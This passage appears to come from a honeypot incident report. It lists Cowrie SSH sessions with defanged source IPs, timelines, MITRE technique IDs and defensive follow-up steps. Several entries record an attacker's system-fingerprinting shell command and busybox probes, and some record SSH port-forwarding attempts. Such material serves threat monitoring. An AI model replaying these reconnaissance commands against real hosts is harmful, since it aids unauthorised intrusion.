| `2026-07-26 05:51:20` | `cowrie.command.input` |
| `2026-07-26 05:51:20` | `cowrie.command.input` |
| `2026-07-26 05:51:20` | `cowrie.log.closed` |
| `2026-07-26 05:51:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efc63ea7e07e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:52 |
| **Last Seen** | 2026-07-26 05:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:52:56` | `cowrie.session.connect` |
| `2026-07-26 05:52:56` | `cowrie.client.version` |
| `2026-07-26 05:52:56` | `cowrie.client.kex` |
| `2026-07-26 05:52:57` | `cowrie.login.success` |
| `2026-07-26 05:52:59` | `cowrie.session.params` |
| `2026-07-26 05:52:59` | `cowrie.command.input` |
| `2026-07-26 05:52:59` | `cowrie.command.input` |
| `2026-07-26 05:52:59` | `cowrie.command.input` |
| `2026-07-26 05:52:59` | `cowrie.command.input` |
| `2026-07-26 05:52:59` | `cowrie.command.input` |
| `2026-07-26 05:52:59` | `cowrie.command.success` |
| `2026-07-26 05:52:59` | `cowrie.command.input` |
| `2026-07-26 05:52:59` | `cowrie.command.input` |
| `2026-07-26 05:52:59` | `cowrie.command.input` |
| `2026-07-26 05:52:59` | `cowrie.command.input` |
| `2026-07-26 05:52:59` | `cowrie.log.closed` |
| `2026-07-26 05:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12515fa5e4a1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:54 |
| **Last Seen** | 2026-07-26 05:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:54:35` | `cowrie.session.connect` |
| `2026-07-26 05:54:36` | `cowrie.client.version` |
| `2026-07-26 05:54:36` | `cowrie.client.kex` |
| `2026-07-26 05:54:37` | `cowrie.login.success` |
| `2026-07-26 05:54:38` | `cowrie.session.params` |
| `2026-07-26 05:54:38` | `cowrie.command.input` |
| `2026-07-26 05:54:38` | `cowrie.command.input` |
| `2026-07-26 05:54:38` | `cowrie.command.input` |
| `2026-07-26 05:54:38` | `cowrie.command.input` |
| `2026-07-26 05:54:38` | `cowrie.command.input` |
| `2026-07-26 05:54:38` | `cowrie.command.success` |
| `2026-07-26 05:54:38` | `cowrie.command.input` |
| `2026-07-26 05:54:38` | `cowrie.command.input` |
| `2026-07-26 05:54:38` | `cowrie.command.input` |
| `2026-07-26 05:54:38` | `cowrie.command.input` |
| `2026-07-26 05:54:39` | `cowrie.log.closed` |
| `2026-07-26 05:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-515f4c21d032

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:56 |
| **Last Seen** | 2026-07-26 05:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:56:13` | `cowrie.session.connect` |
| `2026-07-26 05:56:13` | `cowrie.client.version` |
| `2026-07-26 05:56:13` | `cowrie.client.kex` |
| `2026-07-26 05:56:14` | `cowrie.login.success` |
| `2026-07-26 05:56:15` | `cowrie.session.params` |
| `2026-07-26 05:56:15` | `cowrie.command.input` |
| `2026-07-26 05:56:15` | `cowrie.command.input` |
| `2026-07-26 05:56:15` | `cowrie.command.input` |
| `2026-07-26 05:56:15` | `cowrie.command.input` |
| `2026-07-26 05:56:15` | `cowrie.command.input` |
| `2026-07-26 05:56:15` | `cowrie.command.success` |
| `2026-07-26 05:56:15` | `cowrie.command.input` |
| `2026-07-26 05:56:15` | `cowrie.command.input` |
| `2026-07-26 05:56:15` | `cowrie.command.input` |
| `2026-07-26 05:56:16` | `cowrie.command.input` |
| `2026-07-26 05:56:16` | `cowrie.log.closed` |
| `2026-07-26 05:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df866b40185b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:57 |
| **Last Seen** | 2026-07-26 05:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:57:52` | `cowrie.session.connect` |
| `2026-07-26 05:57:53` | `cowrie.client.version` |
| `2026-07-26 05:57:53` | `cowrie.client.kex` |
| `2026-07-26 05:57:54` | `cowrie.login.success` |
| `2026-07-26 05:57:55` | `cowrie.session.params` |
| `2026-07-26 05:57:55` | `cowrie.command.input` |
| `2026-07-26 05:57:55` | `cowrie.command.input` |
| `2026-07-26 05:57:55` | `cowrie.command.input` |
| `2026-07-26 05:57:55` | `cowrie.command.input` |
| `2026-07-26 05:57:55` | `cowrie.command.input` |
| `2026-07-26 05:57:55` | `cowrie.command.success` |
| `2026-07-26 05:57:55` | `cowrie.command.input` |
| `2026-07-26 05:57:55` | `cowrie.command.input` |
| `2026-07-26 05:57:55` | `cowrie.command.input` |
| `2026-07-26 05:57:55` | `cowrie.command.input` |
| `2026-07-26 05:57:55` | `cowrie.log.closed` |
| `2026-07-26 05:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ad525c97493

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:59 |
| **Last Seen** | 2026-07-26 05:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:59:34` | `cowrie.session.connect` |
| `2026-07-26 05:59:35` | `cowrie.client.version` |
| `2026-07-26 05:59:35` | `cowrie.client.kex` |
| `2026-07-26 05:59:36` | `cowrie.login.success` |
| `2026-07-26 05:59:37` | `cowrie.session.params` |
| `2026-07-26 05:59:37` | `cowrie.command.input` |
| `2026-07-26 05:59:37` | `cowrie.command.input` |
| `2026-07-26 05:59:37` | `cowrie.command.input` |
| `2026-07-26 05:59:37` | `cowrie.command.input` |
| `2026-07-26 05:59:37` | `cowrie.command.input` |
| `2026-07-26 05:59:37` | `cowrie.command.success` |
| `2026-07-26 05:59:37` | `cowrie.command.input` |
| `2026-07-26 05:59:37` | `cowrie.command.input` |
| `2026-07-26 05:59:37` | `cowrie.command.input` |
| `2026-07-26 05:59:37` | `cowrie.command.input` |
| `2026-07-26 05:59:38` | `cowrie.log.closed` |
| `2026-07-26 05:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c74a2689cdca

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 06:01 |
| **Last Seen** | 2026-07-26 06:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:01:19` | `cowrie.session.connect` |
| `2026-07-26 06:01:19` | `cowrie.client.version` |
| `2026-07-26 06:01:19` | `cowrie.client.kex` |
| `2026-07-26 06:01:20` | `cowrie.login.success` |
| `2026-07-26 06:01:21` | `cowrie.session.params` |
| `2026-07-26 06:01:21` | `cowrie.command.input` |
| `2026-07-26 06:01:21` | `cowrie.command.input` |
| `2026-07-26 06:01:21` | `cowrie.command.input` |
| `2026-07-26 06:01:21` | `cowrie.command.input` |
| `2026-07-26 06:01:21` | `cowrie.command.input` |
| `2026-07-26 06:01:21` | `cowrie.command.success` |
| `2026-07-26 06:01:21` | `cowrie.command.input` |
| `2026-07-26 06:01:21` | `cowrie.command.input` |
| `2026-07-26 06:01:21` | `cowrie.command.input` |
| `2026-07-26 06:01:21` | `cowrie.command.input` |
| `2026-07-26 06:01:21` | `cowrie.log.closed` |
| `2026-07-26 06:01:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c70346e8b62a

| Field | Detail |
|---|---|
| **Source IP** | `34.22.226[.]141` |
| **First Seen** | 2026-07-26 06:02 |
| **Last Seen** | 2026-07-26 06:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:02:54` | `cowrie.session.connect` |
| `2026-07-26 06:02:54` | `cowrie.client.version` |
| `2026-07-26 06:02:54` | `cowrie.client.kex` |
| `2026-07-26 06:02:56` | `cowrie.login.success` |
| `2026-07-26 06:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.22.226[.]141` to AbuseIPDB if not already reported
- [ ] Block `34.22.226[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e3e0248349

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 06:02 |
| **Last Seen** | 2026-07-26 06:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:02:55` | `cowrie.session.connect` |
| `2026-07-26 06:02:56` | `cowrie.client.version` |
| `2026-07-26 06:02:56` | `cowrie.client.kex` |
| `2026-07-26 06:02:57` | `cowrie.login.success` |
| `2026-07-26 06:02:58` | `cowrie.session.params` |
| `2026-07-26 06:02:58` | `cowrie.command.input` |
| `2026-07-26 06:02:58` | `cowrie.command.input` |
| `2026-07-26 06:02:58` | `cowrie.command.input` |
| `2026-07-26 06:02:58` | `cowrie.command.input` |
| `2026-07-26 06:02:58` | `cowrie.command.input` |
| `2026-07-26 06:02:58` | `cowrie.command.success` |
| `2026-07-26 06:02:58` | `cowrie.command.input` |
| `2026-07-26 06:02:58` | `cowrie.command.input` |
| `2026-07-26 06:02:58` | `cowrie.command.input` |
| `2026-07-26 06:02:58` | `cowrie.command.input` |
| `2026-07-26 06:02:58` | `cowrie.log.closed` |
| `2026-07-26 06:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69f3d2400f25

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 06:04 |
| **Last Seen** | 2026-07-26 06:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:04:33` | `cowrie.session.connect` |
| `2026-07-26 06:04:33` | `cowrie.client.version` |
| `2026-07-26 06:04:33` | `cowrie.client.kex` |
| `2026-07-26 06:04:35` | `cowrie.login.success` |
| `2026-07-26 06:04:36` | `cowrie.session.params` |
| `2026-07-26 06:04:36` | `cowrie.command.input` |
| `2026-07-26 06:04:36` | `cowrie.command.input` |
| `2026-07-26 06:04:36` | `cowrie.command.input` |
| `2026-07-26 06:04:36` | `cowrie.command.input` |
| `2026-07-26 06:04:36` | `cowrie.command.input` |
| `2026-07-26 06:04:36` | `cowrie.command.success` |
| `2026-07-26 06:04:36` | `cowrie.command.input` |
| `2026-07-26 06:04:36` | `cowrie.command.input` |
| `2026-07-26 06:04:36` | `cowrie.command.input` |
| `2026-07-26 06:04:36` | `cowrie.command.input` |
| `2026-07-26 06:04:36` | `cowrie.log.closed` |
| `2026-07-26 06:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf34222514ba

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 06:06 |
| **Last Seen** | 2026-07-26 06:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:06:15` | `cowrie.session.connect` |
| `2026-07-26 06:06:16` | `cowrie.client.version` |
| `2026-07-26 06:06:16` | `cowrie.client.kex` |
| `2026-07-26 06:06:17` | `cowrie.login.success` |
| `2026-07-26 06:06:18` | `cowrie.session.params` |
| `2026-07-26 06:06:18` | `cowrie.command.input` |
| `2026-07-26 06:06:18` | `cowrie.command.input` |
| `2026-07-26 06:06:18` | `cowrie.command.input` |
| `2026-07-26 06:06:18` | `cowrie.command.input` |
| `2026-07-26 06:06:18` | `cowrie.command.input` |
| `2026-07-26 06:06:18` | `cowrie.command.success` |
| `2026-07-26 06:06:18` | `cowrie.command.input` |
| `2026-07-26 06:06:18` | `cowrie.command.input` |
| `2026-07-26 06:06:18` | `cowrie.command.input` |
| `2026-07-26 06:06:18` | `cowrie.command.input` |
| `2026-07-26 06:06:18` | `cowrie.log.closed` |
| `2026-07-26 06:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ccda9a55b3

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-07-26 06:07 |
| **Last Seen** | 2026-07-26 06:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:07:13` | `cowrie.session.connect` |
| `2026-07-26 06:07:13` | `cowrie.client.version` |
| `2026-07-26 06:07:13` | `cowrie.client.kex` |
| `2026-07-26 06:07:16` | `cowrie.login.success` |
| `2026-07-26 06:07:16` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90fd662a7570

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 06:08 |
| **Last Seen** | 2026-07-26 06:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:08:02` | `cowrie.session.connect` |
| `2026-07-26 06:08:02` | `cowrie.client.version` |
| `2026-07-26 06:08:02` | `cowrie.client.kex` |
| `2026-07-26 06:08:03` | `cowrie.login.success` |
| `2026-07-26 06:08:04` | `cowrie.session.params` |
| `2026-07-26 06:08:04` | `cowrie.command.input` |
| `2026-07-26 06:08:04` | `cowrie.command.input` |
| `2026-07-26 06:08:04` | `cowrie.command.input` |
| `2026-07-26 06:08:04` | `cowrie.command.input` |
| `2026-07-26 06:08:04` | `cowrie.command.input` |
| `2026-07-26 06:08:04` | `cowrie.command.success` |
| `2026-07-26 06:08:04` | `cowrie.command.input` |
| `2026-07-26 06:08:04` | `cowrie.command.input` |
| `2026-07-26 06:08:04` | `cowrie.command.input` |
| `2026-07-26 06:08:04` | `cowrie.command.input` |
| `2026-07-26 06:08:04` | `cowrie.log.closed` |
| `2026-07-26 06:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90226fe90bd6

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]254` |
| **First Seen** | 2026-07-26 06:08 |
| **Last Seen** | 2026-07-26 06:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:08:31` | `cowrie.session.connect` |
| `2026-07-26 06:08:32` | `cowrie.login.success` |
| `2026-07-26 06:08:33` | `cowrie.session.params` |
| `2026-07-26 06:08:33` | `cowrie.log.closed` |
| `2026-07-26 06:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]254` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e8a2190cd5d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 06:08 |
| **Last Seen** | 2026-07-26 06:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 06:08:35` | `cowrie.session.connect` |
| `2026-07-26 06:08:35` | `cowrie.client.version` |
| `2026-07-26 06:08:35` | `cowrie.client.kex` |
| `2026-07-26 06:08:35` | `cowrie.login.success` |
| `2026-07-26 06:08:35` | `cowrie.direct-tcpip.request` |
| `2026-07-26 06:08:35` | `cowrie.direct-tcpip.data` |
| `2026-07-26 06:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f2c71a32bbe

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]254` |
| **First Seen** | 2026-07-26 06:08 |
| **Last Seen** | 2026-07-26 06:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
